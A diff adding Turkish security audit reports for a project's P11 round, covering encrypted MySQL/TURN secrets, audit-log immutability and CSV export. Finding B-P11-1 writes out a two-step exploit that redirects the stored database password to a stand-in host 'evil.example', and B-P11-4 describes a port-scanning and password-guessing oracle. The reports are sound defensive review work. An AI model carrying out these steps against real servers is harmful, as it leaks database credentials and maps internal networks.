@@ -1,3 +1,107 @@
+# Güvenlik Raporu — P11 turu — Doğrulama turu 1 (2026-11-12)
+DURUM: GEÇTİ
+Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 açık (+ 2 madde "Sonra"). Kod turu 1'deki B-P11-1, -2, -5 ve -6 kapandı. B-P11-3 ve B-P11-4 kısmen kapandı; kalan kısımları "Sonra".
+
+Kapsam: implementation.md "P11 — Düzeltme turu 1" (`:3315-3344`). Okunan dosyalar: `settings/{system,routes}.ts`, `lib/crypto.ts`, `audit/read.ts`, contracts `system-settings.ts`, `mysql-form.tsx`, `tr.json`, `test/helpers/secrets.ts`, `settings-p11.test.ts`. `test/unit/p11.test.ts` koşuldu: 14/14 geçti. Entegrasyon testleri tekrar koşulmadı; backend'in bildirdiği sonuç 445/445.
+
+| Bulgu | Durum | Doğrulama |
+|---|---|---|
+| B-P11-1 (Orta) Kayıtlı şifrenin başka hedefe gönderilmesi | KAPANDI | PUT: kayıtlı şifre varken host/port/user değişip şifre gelmezse 400 `fields.password` dönüyor; kontrol TX içinde, `before` okunduktan sonra (`system.ts:109`). Şifre artık `aadFor.mysqlSecret` ile hedefe bağlı AAD (`system_settings.secret_enc:mysql:<host küçük harf>:<port>:<user>`, `crypto.ts:19`) altında saklanıyor. DB'de `value_json` elle değiştirilirse çözülemez → GET `hasPassword:false`, test `secret_unreadable` dönüyor ve probe çağrılmıyor (`:96, :152-155, :163`). Test, şifreyi `rec.core` ile girdinin hedefi aynıysa ve hedefe bağlı AAD ile çözülebiliyorsa kullanıyor; env şifresi yalnız env hedefinde kullanılıyor (`:157-160`). AAD birleştirmesi belirsizlik yaratmıyor: host şemasında `:` yalnız köşeli IPv6 içinde, port sayısal. Test edilen durumlar: farklı host, port ve user ile çözüm reddediliyor (`settings-p11.test.ts:72`); iki adımlı akış testi eklenmiş. Not: eski AAD biçimiyle yazılmış satır çözülemez ve `hasPassword:false` olur; P11 henüz yayında değil, staging'de etkisi yok. |
+| B-P11-2 (Düşük) gitleaks / sahte test değeri | KAPANDI | Değer `test/helpers/secrets.ts` (`FAKE_P11_TURN_SECRET`) dosyasına taşındı ve import ediliyor (`settings-p11.test.ts:11`). Allowlist değişmedi. Tarama aşağıda. |
+| B-P11-3 (Düşük) Test bağlantısında TLS yok | KISMİ → "Sonra" | Arayüzde uyarı var (`mysql-form.tsx:169`, `my.tlsNote`: "şifre ağda şifrelenmeden gider; yalnız güvenilir iç ağ"). Sunucuda TLS seçeneği ve `allowPublicKeyRetrieval` daraltması "Sonra" (backend-dev). |
+| B-P11-4 (Düşük) Port tarama / parola deneme oracle'ı | KISMİ (risk kabulü) → "Sonra" | Global 20/dk kova eklendi (`routes.ts:39`, kişi başı 5/dk'ya ek). Başarısız testte yanıt `latencyMs: null` dönüyor, audit'e süre yazılmıyor (`system.ts:174-176`, contracts `:84`). Risk kabulü `implementation.md:3329`'a yazıldı. Kalan sinyaller: hata sınıfı ve HTTP yanıt süresinin kendisi (anında red ile 10 sn zaman aşımı ayırt edilebiliyor). Bunlar kabul edilen riskin parçası. "Sonra": `rs_mysql_test_failed_total` alarm metriği (devops). |
+| B-P11-5 (Düşük) İmleçte BIGINT taşması | KAPANDI | `decodeCursor`, id > 9223372036854775807 ise 400 `fields.cursor` dönüyor (`read.ts:56-66`). Birim ve entegrasyon testi var. |
+| B-P11-6 (Düşük) Aydınlatma metni sürüm sınırı | KAPANDI | PUT `/settings/consent-text` için tenant başına 10/saat sınırı (`routes.ts:69-76`); 11. istek 429 + `Retry-After` dönüyor. Bellek içi sayaç kullanılıyor (tek instance, ADR-0005); kalıcı tablo büyümesi pratikte sınırlandı. |
+
+## Otomatik tarama
+- `gitleaks v8.30.1 dir /repo --redact --config .gitleaks.toml` → 13 eşleşme. **13'ü de `apps/web/.next/**` altında** (git-ignored derleme çıktısı). `.next` dışında **0** eşleşme var; değerler yazdırılmadı. B-P11-2 sonrası CI'daki git modu gitleaks adımının geçmesi bekleniyor.
+- `pnpm audit --audit-level=moderate` (kod turu 1) → açık yok. Bu turda bağımlılık değişikliği yok.
+
+## "Sonra" önerileri (`docs/gereksinimler.md` §9)
+- B-P11-3: MySQL testi için "TLS gerekli" seçeneği (`ssl.rejectUnauthorized`, servername). TLS kapalıyken `allowPublicKeyRetrieval` yalnız loopback, özel ağ ya da compose servis adında açılmalı. Atanan: backend-dev.
+- B-P11-4: `rs_mysql_test_failed_total` metriği ve alarm eşiği. Atanan: devops.
+- I-P11-1 / I-P11-3 (P13): audit'in harici append-only kopyası; `BEFORE INSERT` ile `created_at = SYSDATE(3)` (UTC) zorlanması. Atanan: dba + devops.
+
+---
+
+# Güvenlik Raporu — P11 turu (sistem ayarları, audit ekranı, aydınlatma metni) — Kod turu 1 (2026-11-12)
+DURUM: GEÇTİ
+Özet: Kritik 0 / Yüksek 0 / Orta 1 / Düşük 5 (+ Bilgi 4)
+
+Kapsam: `git diff HEAD` (commit edilmemiş P11). Okunan dosyalar: migration `20261113090000_p11_system_settings_audit` (up/down), `grants.sql`, `check-app-grants.sh`, `audit/{routes,read,repo,view,mask,service}.ts`, `settings/{routes,system,mysql-probe,consent}.ts`, `public/consent.ts`, `signaling/turn.ts`, `lib/{crypto,csv,rate}.ts`, contracts `api/{audit,system-settings}.ts`, web `audit/audit-log.tsx`, `lib/audit/actions.ts`, ci.yml, compose ve test-db.sh. Testler koşulmadı; tetikleyici davranışı `audit-immutability-p11.test.ts` içeriği ve kodla doğrulandı.
+
+## Bulgular (öncelik sırasıyla)
+
+### [ORTA] B-P11-1 Kayıtlı MySQL şifresi iki adımda başka sunucuya gönderilebiliyor — A07/A04 (Insecure Design)
+Yer: `apps/server/src/settings/system.ts:92` (PUT, şifre boşken `secretEnc` korunuyor) + `:120-124` (test, hedefi kayıtlı `core` ile karşılaştırıyor)
+Sorun: "Şifre başka sunucuya gönderilmez" kuralı, karşılaştırmayı şifrenin girildiği hedefle değil kaydın **güncel** host/port/user değeriyle yapıyor. PUT ise host değiştiğinde şifre boşsa eski şifreyi koruyor. Bu durumda ilk adımda hedef değiştirilir, ikinci adımda test edilir ve kural aşılır.
+İstismar senaryosu: Ele geçirilmiş bir Super Admin oturumu ya da kötü niyetli ikinci bir Super Admin `PUT /admin/settings/mysql {host:"evil.example", port:3306, user:"app", database:"x"}` gönderir (şifre yok, `secretEnc` korunur). Ardından `POST /admin/settings/mysql/test` aynı gövdeyle çağrılır: `sameTarget(rec.core)` true döner, gerçek DB şifresi çözülüp `evil.example`'a gönderilir. `allowPublicKeyRetrieval: true` olduğu için sahte sunucu caching_sha2 akışında kendi RSA anahtarını verir ve şifreyi **düz metin** olarak alır. Şifre arayüzde hiç gösterilmediği halde sızmış olur; saldırgan uygulamayı ve audit'i atlayıp doğrudan DB erişimi kazanır. İz olarak yalnız `settings.mysql.updated` ve `settings.mysql.test` audit kayıtları kalır. `settings-p11.test.ts:106` testi yalnız tek adımlı farklı hedefi deniyor.
+Düzeltme: (a) PUT'ta host, port veya user kayıttakinden farklıysa ve `password` yoksa 400 `fields.password` dönülmeli (ya da `secretEnc = NULL` yapılmalı; hedef değişince şifre yeniden girilir). (b) Savunma derinliği için hedef AAD'ye bağlanmalı: `aadFor.systemSecret("mysql")` + `:${host}:${port}:${user}`. Böylece hedef değişince kayıtlı şifre çözülemez (`secret_unreadable`). (c) "PUT ile hedef değiştir → şifresiz test → 400 ve probe çağrılmadı" entegrasyon testi eklenmeli. Atanan ajan: backend-dev.
+
+### [DÜŞÜK] B-P11-2 gitleaks, P11 test dosyasındaki sahte değeri yakalıyor; commit sonrası CI düşer — A05
+Yer: `apps/server/test/integration/settings-p11.test.ts:15` (`const SECRET = "…"`, kural `generic-api-key`)
+Sorun: Değer sahte. Ancak `.gitleaks.toml` allowlist'i yalnız `test/helpers/{app,secrets}.ts` dosyalarını kapsıyor. CI'daki "gitleaks (tüm geçmiş)" adımı (`ci.yml:174-177`) bu dosya commit edilince `exit 1` verir.
+Düzeltme: Değer `test/helpers/secrets.ts`'e (sahte secret'ların tek kaynağı, S-P3-5) taşınıp oradan import edilmeli. Allowlist genişletilmemeli. **Commit'ten önce** yapılmalı. Atanan ajan: backend-dev.
+
+### [DÜŞÜK] B-P11-3 MySQL testi TLS'siz ve `allowPublicKeyRetrieval: true` ile bağlanıyor — A02
+Yer: `apps/server/src/settings/mysql-probe.ts:53-62`
+Sorun: Hedef internet üzerinde gerçek bir sunucu olsa bile bağlantı açık metin. Yoldaki bir MITM, caching_sha2 tam kimlik doğrulamasında kendi açık anahtarını vererek düz şifreyi alabilir. `mysql_native_password` kullanılıyorsa challenge yanıtını yakalayıp çevrimdışı kırabilir.
+İstismar senaryosu: Super Admin uzak bir MySQL'i test eder; sunucu ile hedef arasındaki ağda bulunan saldırgan şifreyi ele geçirir.
+Düzeltme: Formda "TLS gerekli" seçeneği olmalı (varsayılan açık; `ssl: { rejectUnauthorized: true, servername }`). TLS kapalıyken `allowPublicKeyRetrieval` yalnız loopback, özel ağ veya compose servis adında açılmalı. En azından arayüzde açık metin uyarısı gösterilmeli. "Sonra". Atanan ajan: backend-dev (+ frontend-dev uyarı).
+
+### [DÜŞÜK] B-P11-4 MySQL testi iç ağ port tarama / DB parola deneme oracle'ı (bilinçli host kısıtı yok) — A10 SSRF
+Yer: `apps/server/src/settings/mysql-probe.ts:40-48`, `system.ts:146-148`
+Sorun: `connect`, `timeout`, `auth` ve `database` sınıfları ile `latencyMs`, sunucunun eriştiği ağda açık, kapalı ya da filtreli port ayrımını ve MySQL varlığını veriyor. `127.0.0.1` ve compose `mysql` hedefleri de serbest. Hız sınırı 5/dk/kullanıcı (`routes.ts:37`); yalnız SUPER_ADMIN erişebiliyor; her deneme audit'e yazılıyor; ham hata yalnız logda; `permitLocalInfile` mariadb 3.5.4'te varsayılan false (doğrulandı, yerel dosya okuma yok).
+İstismar senaryosu: Ele geçirilmiş Super Admin hesabıyla saatte 300 hedef taranabilir ya da iç DB kullanıcılarına parola denemesi yapılabilir.
+Düzeltme: Kabul edilen risk olarak `implementation.md`/runbook'a yazılmalı. Başarısız denemede `latencyMs` dönülmemeli ya da 1 sn'ye yuvarlanmalı. Hız sınırı global olarak da (tüm Super Admin'ler için ör. 20/saat) uygulanmalı. Alarm metriği `rs_mysql_test_failed_total` eklenmeli. "Sonra". Atanan ajan: backend-dev.
+
+### [DÜŞÜK] B-P11-5 Audit imlecinde int64 taşması 400 yerine sunucu hatası verebilir — A04
+Yer: `apps/server/src/audit/read.ts:61-63`
+Sorun: `\d{1,19}` en fazla 9999999999999999999 kabul ediyor; bu değer BIGINT sınırını (9223372036854775807) aşıyor. Prisma'nın bu değerde doğrulama hatası (500) fırlatması bekleniyor (test edilmedi). Kapsam ihlali yok: imleç yalnız `scope` + filtre içinde daraltıyor; manipüle edilmiş imleç başka tenant'ın verisini döndürmüyor (`repo.ts:24-32`).
+Düzeltme: `BigInt(m[2]) > 9223372036854775807n` ise 400 `fields.cursor` dönülmeli; birim test eklenmeli. Atanan ajan: backend-dev.
+
+### [DÜŞÜK] B-P11-6 Aydınlatma metni sürüm sayısı ve yazım hızı sınırsız — A04
+Yer: `apps/server/src/settings/routes.ts:61-65`, `public/consent.ts:119-131`
+Sorun: `settings.edit` sahibi, her biri ≤ 20.000 karakter olan sınırsız sayıda sürüm üretebilir. Eski sürümler bilerek silinemediği için kalıcı tablo büyümesi oluşur (değişmeyen gövde sürüm üretmiyor).
+Düzeltme: Kullanıcı başına 10/saat ya da tenant başına günlük sürüm sınırı (429) konmalı. "Sonra". Atanan ajan: backend-dev.
+
+## Bilgi (bulgu değil)
+- **I-P11-1 Tetikleyiciler migrator'a karşı değil, uygulamaya ve kazaya karşı koruma sağlar.** `migrator` DB üzerinde `ALL … WITH GRANT OPTION` yetkisine sahip (`deploy/mysql/init/01-users.sh`). Bu yetkiyle `DROP TRIGGER`, `TRUNCATE` (DELETE tetikleyicisini atlar) ya da `down.sql` çalıştırabilir. Gerçek değiştirilemezlik için audit'in harici append-only kopyası (P13 yedek/WORM ya da log gönderimi) önerilir. `app` için durum: UPDATE/DELETE/TRIGGER/DDL yok; REPLACE ve ODKU yetki gerektirdiği için reddediliyor; `check-app-grants.sh` bunu root ile doğruluyor.
+- **I-P11-2 `--log-bin-trust-function-creators=1`.** Bayrak yalnız binlog güvenlik denetimini (DETERMINISTIC beyanı ve SUPER şartı) gevşetir. Başka bir DEFINER atamak için hâlâ `SET_ANY_DEFINER` gerekir. `app` kullanıcısında CREATE ROUTINE/TRIGGER yok (global, DB ve tablo düzeyi denetlendi), dolayısıyla yetki yükseltme yolu yok. Risk yalnız replikasyon tutarlılığında (tek sunucu, replika yok). 8.4'te değişken deprecated; kaldırılırsa migration 1419 hatasıyla ilk ifadede durur (fail-closed). İmaj digest'le sabitlendiği için sessiz yükseltme olmuyor.
+- **I-P11-3 Saat kaynağı.** `SYSDATE(3)` `SET TIMESTAMP`'ten etkilenmiyor. `CONVERT_TZ(…, @@session.time_zone, '+00:00')` oturum saat dilimi değiştirilse de UTC veriyor. Bilinmeyen dilimde NULL dönüyor, COALESCE ile silme reddediliyor (fail-closed). `--sysdate-is-now` yalnız açılışta verilebilen bir seçenek (dinamik değil); compose'da yok ve uyarı yorumu var. P13 notu: `app` `created_at`'i kendisi yazabiliyor; DELETE yetkisi verildiğinde app geri tarihli **sahte** bir satır ekleyip silebilir, gerçek satırı silemez. P13'te `BEFORE INSERT` ile `NEW.created_at = SYSDATE(3)` (UTC) zorlanması önerilir.
+- **I-P11-4 TURN.** Secret boş bırakılırsa URL değişse de korunuyor (`system.ts:192`). Secret karşı sunucuya gitmiyor; yalnız istemcilere TTL'li HMAC kimliği veriliyor. Kötü niyetli bir TURN adresi bu kimlikleri TTL boyunca gerçek TURN'de kullanabilir. `stun:` adresleri istemcilerin kendi ağındaki iç adreslere UDP STUN isteği gönderebilir. İkisi de yalnız Super Admin yapabildiği için kabul edilebilir.
+
+## Odak kontrolleri (bulgu yok)
+- **Audit değiştirilemezliği (G-15, AC-123):** `audit_logs_no_update` her UPDATE'i (ODKU dahil) SIGNAL ile reddediyor. Retention tetikleyicisi 730 günden yeni satırı reddediyor. `grants.sql`'de app için audit_logs SELECT/INSERT var, DELETE bilerek P13'e bırakılmış. `system_settings` için SELECT/INSERT/UPDATE var, DELETE/DDL yok. `down.sql` guard'ı: geçici tablo CHECK'i (3819) `system_settings` doluyken hiçbir şey değiştirmeden duruyor; REVOKE tablo düşmeden önce yapılıyor.
+- **Audit okuma kapsamı:** `auditScope` (`read.ts:35-39`): firma seçmemiş SUPER_ADMIN tüm tenant'ları görüyor; diğer roller yalnız etkin tenant'ı görüyor, tenant yoksa 403. `tenantId` sorgu parametresi yalnız `all` kapsamında uygulanıyor (`read.ts:49`). Her sorguda `tenantId` AND koşulu var (`repo.ts:26`). `userId` filtresi ve `userNames` tenant dışına çıkmıyor. Sıra requireAuth → requirePerm(`audit.view` / `audit.export`). `Cache-Control: no-store` var.
+- **Okuma maskesi:** `auditValueView` her satırı yeniden maskeliyor (`mask.ts` kara liste). Dış gönderim eylemlerinde (`mail.*`, `session.email`, `settings.*.test`, `*smtp*`) izinli alan izdüşümü uygulanıyor; `reason` yalnız `[a-z_]{1,40}` sınıfı olarak dönüyor, aksi halde `other`. İç içe nesne düşüyor. Alıcılar yazımda zaten maskeli (`mail/service.ts:186`, `smtp-routes.ts:28`). UI bu kayıtlarda yalnız `reason` gösteriyor. **B-P10 koşulu karşılandı.**
+- **405:** `POST/PUT/PATCH/DELETE` istekleri `/audit`, `/audit/export.csv` ve `/audit/:id` için kimlik doğrulamadan önce `Allow` başlığıyla 405 dönüyor. Bilgi sızıntısı yok.
+- **CSV (AC-124, G-16):** `csvCell` her hücreye (başlık, JSON ve User-Agent dahil) formül kaçışı uyguluyor (`= + - @ TAB CR`, baştaki boşluk/NBSP ve tam genişlik varyantları dahil), ardından RFC 4180 tırnaklama. 5/dk/kullanıcı limiti var (6. istek 429). Yarım dosya oluşmaması için önce `take: 50001` ile sayılıyor; 50.000'i aşarsa 400. Audit kaydı yazılıyor. Dosya adı sunucuda üretiliyor ve `nosniff` başlığı var.
+- **XSS:** Audit detayı `JSON.stringify` çıktısını `<pre>` içinde React metin düğümü olarak basıyor. Aydınlatma metni katılım sayfasında `whitespace-pre-line` metin düğümüyle gösteriliyor (`join-form.tsx:150`). Projede `dangerouslySetInnerHTML` yok. Gövdede kontrol, bidi ve sıfır genişlikli karakterler reddediliyor.
+- **Aydınlatma metni bütünlüğü:** app'in `consent_texts` üzerinde yalnız SELECT/INSERT ve sütun bazlı UPDATE(`is_current`, `updated_at`) yetkisi var; body, sha256 ve version değiştirilemez. Onay `id + tenantId + isCurrent` ile bağlanıyor (`consent.ts:61`, `requests/service.ts:266`). Eşzamanlı yayın koşullu `updateMany` ile 409 alıyor. Audit'e gövde değil `{version, sha256}` yazılıyor. Erişim `settings.view/edit` + `tenantScope` ile korunuyor.
+- **MySQL ve TURN gizlileri:** AES-256-GCM, satır anahtarına bağlı AAD ile şifreleniyor (mysql↔turn takası çözülmüyor; test `:67`). GET yanıtı yalnız `hasPassword` / `hasSecret` döndürüyor. Audit'te `password` / `secret` → `***`. Probe hatası loga yalnız errno, code ve 300 karakterlik mesaj olarak yazılıyor (şifre yok). `requireSuperAdmin` bütün `/admin/settings` uçlarında preHandler. TURN şeması: `^(stun|turn|turns):[!-~]+$`, en çok 10 tekil adres, secret 32..256 karakter ve `#`/boşluk içermiyor. zod ile DB CHECK birebir uyumlu. Panel ayarı PUT/DELETE sonrası `applyTurn` ile `rooms.turn`'e uygulanıyor. Secret çözülemezse `iceServersFor` yalnız STUN veriyor; kimliksiz TURN verilmiyor (`turn.ts:28`). Açılışta DB okunamazsa env kullanılıyor ve alarm logu düşülüyor.
+- **CI ve bağımlılık:** Root parolası CLI argümanında değil, konteyner env'inden (`MYSQL_PWD`) okunuyor. Yeni action eklenmedi; mevcut SHA sabitlemeleri değişmedi. Yeni npm bağımlılığı yok (mariadb, Prisma adaptörünün mevcut bağımlılığı). Yeni env değişkeni yok (`TEST_MIGRATE_DATABASE_URL` yalnız test). test-db.sh imajı digest ile sabitlendi.
+
+## Otomatik tarama çıktıları
+- `pnpm audit --audit-level=moderate` → "No known vulnerabilities found".
+- `gitleaks v8.30.1 dir /repo --redact --config .gitleaks.toml` → 14 eşleşme, değerler yazdırılmadı. 13 tanesi `apps/web/.next/**` derleme çıktısında (Next preview/prerender anahtarları; `.next` git-ignored, repoya girmez). 1 tanesi `apps/server/test/integration/settings-p11.test.ts:15` (sahte değer, untracked) → B-P11-2.
+- `git log --all -- '*.env' '.env*'`: yalnız `.env.example` geçmişi (önceki turlarda doğrulandı, P11'de değişiklik yok).
+- P11 dosyalarında `git grep` gizli bilgi kalıbı → eşleşme yok.
+
+## Tasarımda vaat edilip kodda bulunmayanlar
+- "Kayıtlı şifre yalnız aynı host/port/kullanıcı için kullanılır; başka sunucuya gönderilmez" (`system-settings.ts:71`, `system.ts:109-111`) iki adımlı akışta sağlanmıyor → B-P11-1.
+
+## Olumlu
+- Tetikleyicide SET TIMESTAMP ve time_zone hileleri deneyle bulunup SYSDATE + CONVERT_TZ ile kapatılmış; fail-closed tasarlanmış.
+- Okuma tarafında ikinci maske ve dış gönderim izdüşümü var; eski veya elle yazılmış satırlara karşı savunma derinliği sağlıyor.
+- CSV formül kaçışı tek modülde, P8 ile ortak.
+- DB CHECK'leri zod ile birebir. `value_json`'a gizli alan yazılamıyor (additionalProperties:false).
+- Sorunun sınıfı yanıtta, ham hata yalnız logda. Zaman aşımı kesin ve geç gelen bağlantı da kapatılıyor.
+
+Öneri: B-P11-3, B-P11-4 ve B-P11-6 `docs/gereksinimler.md` §9'a "Sonra" olarak eklensin. B-P11-1 ve B-P11-2 P11 kapanmadan düzeltilsin (B-P11-2 commit'i engeller).
+
+---
+
 # Güvenlik Raporu — P10 — Kod turu 3 (2026-11-12, dar kapsam)
 DURUM: GEÇTİ
 Özet: Kritik 0 / Yüksek 0 / Orta 0 / Düşük 0 (+ Bilgi 2). Tur 2'deki B-P10-10 ve B-P10-11 kapandı.
